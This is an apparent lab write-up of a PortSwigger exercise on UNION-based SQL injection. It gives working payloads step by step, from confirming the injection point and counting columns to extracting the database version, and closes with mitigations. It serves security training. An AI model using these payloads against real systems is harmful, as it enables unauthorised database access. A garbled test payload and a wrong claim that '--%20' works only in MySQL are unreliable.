# SQL Injection - UNION-based Version Disclosure

# Vulnerability overview
This lab contains a SQL injection vulnerability in the product category filter. Allowing attacker to use UNION attack to retrieve the results from an injected query.

# Steps to Reproduce

**Lab Link** >> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

*Navigate to*
* /filter?category=Lifestyle

*Test input*
* category=Lifestyle'
    → Internal server error → confirm injection point

*Bypass Query using comment*
* category=Lifestyle'--
    → Internal server error.
* category=Lifestyle'--%20
    → Successful execution → Confirms MYSQL database (--%20 is the comment used only in mysql database. here %20 is url encoded form of <space button>)

*Determine number of columns*
* category=Lifestyle' order by 2 --%20
    → Successful execution
* category=Lifestyle' order by 3 --%20
    → Error → Confirms 2 columns

*Identify string competibility*
* category=' union select 'test,'test' --%20
    → Successful execution

*Retrive Database version*
* category=' union select null,@@version --%20
    → Successful execution → Lab solved.

# Payload used
' union select null,@@version --%20

# Impact
An attacker can perform database fingerprinting and extract sensitive information, enabling targeted attacks based on the database version.

# Tools Used
Browser
Burp Suite (Proxy, Repeater)

# Mitigation
Use parameterized queries
Implement input validation
Restrict database error messages